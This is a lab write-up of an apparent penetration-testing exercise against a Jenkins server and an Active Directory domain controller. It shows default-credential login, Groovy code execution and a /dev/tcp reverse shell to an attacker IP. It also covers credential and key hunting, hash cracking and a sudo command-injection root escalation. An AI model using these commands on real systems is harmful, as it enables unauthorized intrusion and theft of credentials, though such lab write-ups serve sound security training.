# Anomaly

## Anomaly

![image.png](<../.gitbook/assets/image (2).png>)

### **Objective and Scope**

#### **Objective**

The core objective is to demonstrate the full impact of a successful network intrusion by achieving **Domain Administrator** privileges over the client's Active Directory environment. The test will simulate a motivated external attacker's progression from an initial foothold to complete administrative control.

#### **Scope**

The in-scope assets for this engagement include **two critical IP addresses**:

1. A hardened **Ubuntu Server** (Initial Foothold Target).
2. The primary **Domain Controller** (Final Privilege Escalation Target).

It is a critical finding that the **Domain Controller is running active Antivirus (AV) software**; therefore, common attack paths may fail due to detection by AV.

### Recon & Enumeration

#### Rustscan enum Anomaly-Web `10.1.107.2`

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 d0:42:fa:97:71:c5:42:79:03:b1:82:d9:87:28:a1:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLrKVgZBjQyDNBuq3gL3BDIgqhDkb3LYDklDSx38X2nAFxg2yzv8h566WE7z+wHyBfngdw7/oCZtsKT5X7VsXqk=
|   256 71:45:58:8f:02:af:71:98:7c:62:7d:fb:37:ac:d5:d7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExPWzi0GVGYmPEYt9wfS6ycFJwe/jSQlZv82+broCTz

8080/tcp open  http    syn-ack ttl 62 Jetty 10.0.20
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(10.0.20)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 

```

#### Rustscan enum Anomaly-DC `10.1.69.52`

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-04-03 03:39:54Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: anomaly.hsm, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=Anomaly-DC.anomaly.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Anomaly-DC.anomaly.hsm
| Issuer: commonName=anomaly-ANOMALY-DC-CA-2/domainComponent=anomaly
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T22:14:26
| Not valid after:  2026-09-21T22:14:26
| MD5:     2fe3 c33e 4416 0677 f09c 3141 7ebc dadb
| SHA-1:   b3a6 bd0d 65f4 b2df 70eb efa4 8743 fe35 41ad 9aaf
| SHA-256: 99ab 3b07 6b16 f90b fbfe 1f34 07c4 766c 05fb a0f1 45b5 3086 e687 7abc a5cb 1463

445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: anomaly.hsm, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=Anomaly-DC.anomaly.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Anomaly-DC.anomaly.hsm
| Issuer: commonName=anomaly-ANOMALY-DC-CA-2/domainComponent=anomaly
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T22:14:26
| Not valid after:  2026-09-21T22:14:26
| MD5:     2fe3 c33e 4416 0677 f09c 3141 7ebc dadb
| SHA-1:   b3a6 bd0d 65f4 b2df 70eb efa4 8743 fe35 41ad 9aaf
| SHA-256: 99ab 3b07 6b16 f90b fbfe 1f34 07c4 766c 05fb a0f1 45b5 3086 e687 7abc a5cb 1463

|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: anomaly.hsm, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=Anomaly-DC.anomaly.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Anomaly-DC.anomaly.hsm
| Issuer: commonName=anomaly-ANOMALY-DC-CA-2/domainComponent=anomaly
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T22:14:26
| Not valid after:  2026-09-21T22:14:26
| MD5:     2fe3 c33e 4416 0677 f09c 3141 7ebc dadb
| SHA-1:   b3a6 bd0d 65f4 b2df 70eb efa4 8743 fe35 41ad 9aaf
| SHA-256: 99ab 3b07 6b16 f90b fbfe 1f34 07c4 766c 05fb a0f1 45b5 3086 e687 7abc a5cb 1463

|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: anomaly.hsm, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=Anomaly-DC.anomaly.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Anomaly-DC.anomaly.hsm
| Issuer: commonName=anomaly-ANOMALY-DC-CA-2/domainComponent=anomaly
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T22:14:26
| Not valid after:  2026-09-21T22:14:26
| MD5:     2fe3 c33e 4416 0677 f09c 3141 7ebc dadb
| SHA-1:   b3a6 bd0d 65f4 b2df 70eb efa4 8743 fe35 41ad 9aaf
| SHA-256: 99ab 3b07 6b16 f90b fbfe 1f34 07c4 766c 05fb a0f1 45b5 3086 e687 7abc a5cb 1463

3389/tcp  open  ms-wbt-server syn-ack ttl 126
| rdp-ntlm-info: 
|   Target_Name: ANOMALY
|   NetBIOS_Domain_Name: ANOMALY
|   NetBIOS_Computer_Name: ANOMALY-DC
|   DNS_Domain_Name: anomaly.hsm
|   DNS_Computer_Name: Anomaly-DC.anomaly.hsm
|   Product_Version: 10.0.26100
|_  System_Time: 2026-04-03T03:41:01+00:00
| ssl-cert: Subject: commonName=Anomaly-DC.anomaly.hsm
| Issuer: commonName=Anomaly-DC.anomaly.hsm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-02T03:29:12
| Not valid after:  2026-10-02T03:29:12
| MD5:     b81b 78ef 43f2 a78a 6768 cb67 c21e b78d
| SHA-1:   4625 ab9a e159 e6df 8fc6 4972 98f2 b65c 2de5 68c4
| SHA-256: 6d37 2e57 00c0 1f04 bf1d 1c1f 23db c53b 5d23 9256 762b 95e1 ee2e 4f01 060d 75ad
|_ssl-date: TLS randomness does not represent time
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49682/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49683/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49702/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49715/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49755/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
51439/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC

Uptime guess: 0.009 days (since Thu Apr  2 23:28:50 2026)
Network Distance: 3 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: ANOMALY-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-time: 
|   date: 2026-04-03T03:41:02
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 35091/tcp): CLEAN (Timeout)
|   Check 2 (port 23997/tcp): CLEAN (Timeout)
|   Check 3 (port 17792/udp): CLEAN (Timeout)
|   Check 4 (port 24136/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

```

#### Generating host files

```bash
nxc smb 10.1.69.52  -u ''-p '' --generate-hosts-file hosts

```

### Checking for quick wins

_**###Below is my cheat sheet i usually use for quick wins in AD-environments#####**_

As a best practice, always check for the following:

* Enumerating other users
* Enumerating for pre-created computer accounts
* Enumerating for `certificate services`
* Enumerating for `ZeroLOgon`
* Enumerating for `Kerberoasting` and `AS-REP` - We can also get this from `Bloodhound`
* Enumerating for `gpp_autologin`

NB - Sometimes not necessary but worth digging into.

**`*Change the commands according the the domain you are working with. I just copied from the previous notes*`**

```bash
nxc smb buildingmagic.local -u 'r.widdleton' -p 'lilronron'  --rid-brute | grep 'SidTypeUser' 
nxc ldap buildingmagic.local -u 'r.widdleton' -p 'lilronron'  --users
nxc smb buildingmagic.local -u 'r.widdleton' -p 'lilronron'  --users

nxc ldap buildingmagic.local -u 'r.widdleton' -p 'lilronron'  -M pre2k
nxc ldap buildingmagic.local -u 'r.widdleton' -p 'lilronron'  -M adcs
nxc smb buildingmagic.local -u 'r.widdleton' -p 'lilronron'  -M zerologon
nxc smb  buildingmagic.local -u 'r.widdleton' -p 'lilronron'  -M gpp_autologin

```

## Anomaly-Web `10.1.107.2`

#### Rustscan enum Anomaly-Web `10.1.107.2`

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 d0:42:fa:97:71:c5:42:79:03:b1:82:d9:87:28:a1:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLrKVgZBjQyDNBuq3gL3BDIgqhDkb3LYDklDSx38X2nAFxg2yzv8h566WE7z+wHyBfngdw7/oCZtsKT5X7VsXqk=
|   256 71:45:58:8f:02:af:71:98:7c:62:7d:fb:37:ac:d5:d7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExPWzi0GVGYmPEYt9wfS6ycFJwe/jSQlZv82+broCTz

8080/tcp open  http    syn-ack ttl 62 Jetty 10.0.20
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(10.0.20)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 

```

* Only 2 ports are open: ssh running on port 22& http running on port 8080
* Having a website running, a few things we need to do
  * Directory Brute-forcing
  * Subdomains and Virtual Hosts fuzzing
  * Check view source
  * Check /robot.txt
  * check web functionality

_**Directory Brute-forcing**_

```bash
dirsearch -u http://10.1.107.2:8080 -t 5 

ffuf -u "http://10.1.107.2:8080/FUZZ" \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-recursion -recursion-depth 2 -c

gobuster dir -u http://10.1.107.2:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,zip
```

![image.png](<../.gitbook/assets/image 1 (5).png>)

![image.png](<../.gitbook/assets/image 2 (4).png>)

_**Subdomains and Virtual Hosts**_

```bash
./vhost-fuzzer.sh anomaly.Web  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://web.server 1

ffuf -u http:/anomaly.Web  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.$DOMAIN"
```

_**Check web functionality**_

![image.png](<../.gitbook/assets/image 3 (4).png>)

* We have a jenkins instance and we need to enumerate more

#### **Banner Grabbing and Version Detection jenkins**

```bash
# Get Jenkins version
curl -s http://10.1.107.2:8080 | grep -i "jenkins"

# From API
curl -s http://10.1.107.2:8080/api/json | jq .

# From headers
curl -I http:/10.1.107.2:8080 | grep -i "x-jenkins"

# Version from login page
curl -s http://10.1.107.2:8080/login | grep "Jenkins ver"
```

![image.png](<../.gitbook/assets/image 4 (4).png>)

![image.png](<../.gitbook/assets/image 5 (4).png>)

* Jenkins version disclosure
* we can search for available vulnerabilities regarding `jenkins 2.452.1`

#### _Testing Common Creds first_

```bash
# Common default/weak credentials
admin:admin
jenkins:jenkins
admin:password
admin:jenkins
user:user
```

![image.png](<../.gitbook/assets/image 6 (3).png>)

* `admin:admin` creds worked

#### Jenkins RCE

```bash
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

![image.png](<../.gitbook/assets/image 7 (3).png>)

* a successful Remote Code Execution (RCE) on a Jenkins instance using the **Script Console** (`/script`). The Groovy script executed the `id` command, confirming that the application is running as the `jenkins` user
*   Now we want to obtain a reverse shell

    ```bash
    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.200.45.8/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()
    ```

    ```bash
    RedBlue@Frank Anomaly % sudo nc -lnvp 8443                                    
    [sudo] password for RedBlue: 
    listening on [any] 8443 ...
    connect to [10.200.45.8] from (UNKNOWN) [10.1.107.2] 46982
    python3 -c 'import pty;pty.spawn("/bin/bash")'
      File "<string>", line 1
        'import
        ^
    SyntaxError: unterminated string literal (detected at line 1)
    id
    uid=111(jenkins) gid=113(jenkins) groups=113(jenkins)
    /bin/bash -i
    bash: cannot set terminal process group (550): Inappropriate ioctl for device
    bash: no job control in this shell
    jenkins@ip-10-1-107-2:~$ 

    ```

    ![image.png](<../.gitbook/assets/image 8 (3).png>)

    * **`secrets/` directory:** This is where Jenkins stores its encryption keys (like `master.key` and `hudson.util.Secret`). You can use these to decrypt any stored credentials or build parameters.
    * **`jobs/` directory:** Contains build configurations. Check these for hardcoded passwords, API keys, or scripts that might contain sensitive information.
    * **`config.xml`:** Contains the main configuration for the Jenkins instance, including security realm settings and authorization strategies.
    * **`secret.key.not-so-secret`:** While the name is humorous, it's often used for legacy reasons; the real keys are usually inside the `secrets/` folder.

#### Searching for **credentials**, **SSH keys**, and **passwords** inside configuration files

```bash
find . -maxdepth 3 -name "*.xml" -o -name "master.key" -o -name "hudson.util.Secret" -o -name "id_rsa" | xargs -I {} grep -Hli "password\|secret\|key\|credential" {} 2>/dev/null

find . -type f \( -name "*.xml" -o -name "*.key" -o -name "*.txt" \) 2>/dev/null | xargs -I {} sh -c 'echo "===== {} ====="; cat {}'
```

```bash
jenkins@ip-10-1-107-2:~$ find . -maxdepth 3 -name "*.xml" -o -name "master.key" -o -name "hudson.util.Secret" -o -name "id_rsa" | xargs -I {} grep -Hli "password\|secret\|key\|credential" {} 2>/dev/null
./users/admin_12913718988981174255/config.xml
jenkins@ip-10-1-107-2:~$ cat users/admin_12913718988981174255/config.xml
<?xml version='1.1' encoding='UTF-8'?>
<user>
  <version>10</version>
  <id>admin</id>
  <fullName>admin</fullName>
  <properties>
    <jenkins.console.ConsoleUrlProviderUserProperty/>
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@1380.va_435002fa_924">
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash"/>
    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>
    <hudson.model.MyViewsProperty>
      <views>
        <hudson.model.AllView>
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
          <name>all</name>
          <filterExecutors>false</filterExecutors>
          <filterQueue>false</filterQueue>
          <properties class="hudson.model.View$PropertyList"/>
        </hudson.model.AllView>
      </views>
    </hudson.model.MyViewsProperty>
    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.204.vf6fddd8a_8b_e9">
      <providerId>default</providerId>
    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>
    <hudson.model.PaneStatusProperties>
      <collapsed/>
    </hudson.model.PaneStatusProperties>
    <jenkins.security.seed.UserSeedProperty>
      <seed>05a17439ef4a8e33</seed>
    </jenkins.security.seed.UserSeedProperty>
    <hudson.search.UserSearchProperty>
      <insensitiveSearch>true</insensitiveSearch>
    </hudson.search.UserSearchProperty>
    <hudson.model.TimeZoneProperty/>
    <jenkins.model.experimentalflags.UserExperimentalFlagsProperty>
      <flags/>
    </jenkins.model.experimentalflags.UserExperimentalFlagsProperty>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <passwordHash>#jbcrypt:$2a$10$fm3mmEJw/LD9oUNvH2DXA.cpwVHN676vMBrIJPy9lHOZbGpGutrja</passwordHash>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
    <hudson.tasks.Mailer_-UserProperty plugin="mailer@488.v0c9639c1a_eb_3">
      <emailAddress>admin@anomaly.hsm</emailAddress>
    </hudson.tasks.Mailer_-UserProperty>
    <jenkins.security.ApiTokenProperty>
      <tokenStore>
        <tokenList/>
      </tokenStore>
    </jenkins.security.ApiTokenProperty>
    <jenkins.security.LastGrantedAuthoritiesProperty>
      <roles>
        <string>authenticated</string>
      </roles>
      <timestamp>1758490356718</timestamp>
    </jenkins.security.LastGrantedAuthoritiesProperty>
  </properties>
</user>jenkins@ip-10-1-107-2:~$ 

```

![image.png](<../.gitbook/assets/image 9 (5).png>)

*   We obtained a password hash that is a jbcrypt

    ```bash
    $2a$10$fm3mmEJw/LD9oUNvH2DXA.cpwVHN676vMBrIJPy9lHOZbGpGutrja
    hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
    ```

    ![image.png](<../.gitbook/assets/image 10 (5).png>)

    * Tried cracking the password but it was taking a long time.

#### Privs Escalation to root

```bash
jenkins@ip-10-1-107-2:~$ sudo -l
Matching Defaults entries for jenkins on ip-10-1-107-2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jenkins may run the following commands on ip-10-1-107-2:
    (ALL) NOPASSWD: /usr/bin/router_config
jenkins@ip-10-1-107-2:~$ 

```

![image.png](<../.gitbook/assets/image 11 (5).png>)

*   discovered **NOPASSWD** permissions to run `/usr/bin/router_config` as any user (including **root**)

    ```bash
    file /usr/bin/router_config
    ls -l /usr/bin/router_config
    strings /usr/bin/router_config

    sudo /usr/bin/router_config "test; /bin/bash"

    ```

    ![image.png](<../.gitbook/assets/image 12 (5).png>)

    *   navigate to /root and `cat` the user flag

        ![image.png](<../.gitbook/assets/image 13 (5).png>)

## Anomaly-DC `10.1.69.52`

#### Rustscan enum Anomaly-DC `10.1.69.52`

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-04-03 03:39:54Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: anomaly.hsm, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=Anomaly-DC.anomaly.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Anomaly-DC.anomaly.hsm
| Issuer: commonName=anomaly-ANOMALY-DC-CA-2/domainComponent=anomaly
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T22:14:26
| Not valid after:  2026-09-21T22:14:26
| MD5:     2fe3 c33e 4416 0677 f09c 3141 7ebc dadb
| SHA-1:   b3a6 bd0d 65f4 b2df 70eb efa4 8743 fe35 41ad 9aaf
| SHA-256: 99ab 3b07 6b16 f90b fbfe 1f34 07c4 766c 05fb a0f1 45b5 3086 e687 7abc a5cb 1463

445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: anomaly.hsm, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=Anomaly-DC.anomaly.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Anomaly-DC.anomaly.hsm
| Issuer: commonName=anomaly-ANOMALY-DC-CA-2/domainComponent=anomaly
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T22:14:26
| Not valid after:  2026-09-21T22:14:26
| MD5:     2fe3 c33e 4416 0677 f09c 3141 7ebc dadb
| SHA-1:   b3a6 bd0d 65f4 b2df 70eb efa4 8743 fe35 41ad 9aaf
| SHA-256: 99ab 3b07 6b16 f90b fbfe 1f34 07c4 766c 05fb a0f1 45b5 3086 e687 7abc a5cb 1463

|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: anomaly.hsm, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=Anomaly-DC.anomaly.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Anomaly-DC.anomaly.hsm
| Issuer: commonName=anomaly-ANOMALY-DC-CA-2/domainComponent=anomaly
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T22:14:26
| Not valid after:  2026-09-21T22:14:26
| MD5:     2fe3 c33e 4416 0677 f09c 3141 7ebc dadb
| SHA-1:   b3a6 bd0d 65f4 b2df 70eb efa4 8743 fe35 41ad 9aaf
| SHA-256: 99ab 3b07 6b16 f90b fbfe 1f34 07c4 766c 05fb a0f1 45b5 3086 e687 7abc a5cb 1463

|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: anomaly.hsm, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=Anomaly-DC.anomaly.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Anomaly-DC.anomaly.hsm
| Issuer: commonName=anomaly-ANOMALY-DC-CA-2/domainComponent=anomaly
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T22:14:26
| Not valid after:  2026-09-21T22:14:26
| MD5:     2fe3 c33e 4416 0677 f09c 3141 7ebc dadb
| SHA-1:   b3a6 bd0d 65f4 b2df 70eb efa4 8743 fe35 41ad 9aaf
| SHA-256: 99ab 3b07 6b16 f90b fbfe 1f34 07c4 766c 05fb a0f1 45b5 3086 e687 7abc a5cb 1463

3389/tcp  open  ms-wbt-server syn-ack ttl 126
| rdp-ntlm-info: 
|   Target_Name: ANOMALY
|   NetBIOS_Domain_Name: ANOMALY
|   NetBIOS_Computer_Name: ANOMALY-DC
|   DNS_Domain_Name: anomaly.hsm
|   DNS_Computer_Name: Anomaly-DC.anomaly.hsm
|   Product_Version: 10.0.26100
|_  System_Time: 2026-04-03T03:41:01+00:00
| ssl-cert: Subject: commonName=Anomaly-DC.anomaly.hsm
| Issuer: commonName=Anomaly-DC.anomaly.hsm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-02T03:29:12
| Not valid after:  2026-10-02T03:29:12
| MD5:     b81b 78ef 43f2 a78a 6768 cb67 c21e b78d
| SHA-1:   4625 ab9a e159 e6df 8fc6 4972 98f2 b65c 2de5 68c4
| SHA-256: 6d37 2e57 00c0 1f04 bf1d 1c1f 23db c53b 5d23 9256 762b 95e1 ee2e 4f01 060d 75ad
|_ssl-date: TLS randomness does not represent time
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49682/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49683/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49702/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49715/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49755/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
51439/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC

Uptime guess: 0.009 days (since Thu Apr  2 23:28:50 2026)
Network Distance: 3 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: ANOMALY-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-time: 
|   date: 2026-04-03T03:41:02
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 35091/tcp): CLEAN (Timeout)
|   Check 2 (port 23997/tcp): CLEAN (Timeout)
|   Check 3 (port 17792/udp): CLEAN (Timeout)
|   Check 4 (port 24136/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

```

* This is an active directory and we do not have any creds to start with
*   Simple things first, lets try to authenticate with null creds

    ![image.png](<../.gitbook/assets/image 14 (5).png>)

#### _**Generating host files**_

```bash
nxc smb anomaly.hsm  -u '' -p '' --generate-hosts-file hosts

```

![image.png](<../.gitbook/assets/image 15 (3).png>)

#### _**Enumerating users**_

```bash
nxc smb anomaly.hsm  -u '' -p '' --users

nxc smb anomaly.hsm -u '' -p '' --rid-brute \
    | awk -F'[\\()]' '/SidTypeUser/ { print $2 }' > users.txt
    
kerbrute userenum -d anomaly.hsm --dc 10.1.69.52 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

```

![image.png](<../.gitbook/assets/image 16 (3).png>)

![image.png](<../.gitbook/assets/image 17 (4).png>)

* We failed to Enumerate usernames with three different approaches
* Lets enumerate other services next

#### _**Enumerating DNS - 53**_

```bash
 RedBlue@Frank Anomaly %  dig axfr anomaly.hsm @10.1.69.52

; <<>> DiG 9.20.15-2-Debian <<>> axfr anomaly.hsm @10.1.69.52
;; global options: +cmd
; Transfer failed.
RedBlue@Frank Anomaly % 
```

![image.png](<../.gitbook/assets/image 18 (2).png>)

* Nothing of interest obtained

_**Enumerating ldap-**_**&#x20;389**

```bash
#**Base Naming Context
ldapsearch -H ldap://**10.1.69.52 **-x -s base namingcontexts**
```

![image.png](<../.gitbook/assets/image 19 (4).png>)

```bash
ldapsearch -H ldap://10.1.69.52 -x -s base -b "DC=anomaly,DC=hsm"
ldapsearch -H ldap://10.1.69.52 -x -b "DC=anomaly,DC=hsm" "(objectClass=user)"

```

![image.png](<../.gitbook/assets/image 20 (4).png>)

* Nothing too interesting here either

#### _**Enumerating port 80**_

* Having a website running, a few things we need to do
  * Directory Brute-forcing
  * Subdomains and Virtual Hosts fuzzing
  * Check view source
  * Check /robot.txt
  * check web functionality

_**Directory Brute-forcing**_

```bash
dirsearch -u http://10.1.69.52 -t 5 

ffuf -u "http://10.1.69.52/FUZZ" \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-recursion -recursion-depth 2 -c

gobuster dir -u http://10.1.69.52 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,zip
```

\###At this point i am stuck……..I need to go back to the Anomaly-Web `10.1.107.2` to check if i did not miss anything.

* Used linpeas to uncover these.

![image.png](<../.gitbook/assets/image 21 (4).png>)

![image.png](<../.gitbook/assets/image 22 (4).png>)

* The Anomaly-Web `10.1.107.2` is integrated with the Active Directory domain `ANOMALY.HSM`

#### Enumerating _**The Keytab File**_ (`/etc/krb5.keytab`)

* A `.keytab` file is essentially a file that contains Kerberos keys (long-term passwords). Its purpose is to allow a service or user to authenticate to the Domain Controller **without typing a password.** \* **The Risk:** Since you have read access to this file (or your tool does), you can authenticate as the user stored inside it.
* The file contains the credentials for **`Brandon_Boyd@ANOMALY.HSM`**
